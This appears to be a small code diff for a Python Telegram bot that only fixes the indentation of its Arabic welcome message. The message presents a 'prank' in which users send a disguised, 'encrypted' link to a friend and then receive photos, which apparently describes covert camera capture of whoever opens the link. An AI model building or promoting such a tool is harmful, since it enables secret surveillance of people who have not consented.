@@ -146,7 +146,7 @@ def send_welcome(message):
     # عرض عدد المستخدمين الحالي
     total_users = len(user_stats)
     
-   response = (
+    response = (
        f"🎉 أهلاً بك يا *{user_name}*!\n\n"
        f"👥 *عدد مستخدمي البوت:* {total_users} مستخدم\n\n"
        f"📸 *فكرة البوت (مزحة خفيفة مع صديقك):*\n"
@@ -158,7 +158,7 @@ def send_welcome(message):
        f"2️⃣ أرسله لصديقك في رسالة (أو جربه بنفسك).\n"
        f"4️⃣ سيبدأ البوت فوراً بإرسال الصور إليك.\n\n"
        f"🔒 *ملاحظة:* الرابط مشفر بالكامل، لا يمكن لأحد معرفة الرقم الأصلي."
-   )
+    )
     bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
     logger.info(f"User started: {user_name} (ID: {user_id}) - New: {is_new_user}")
 
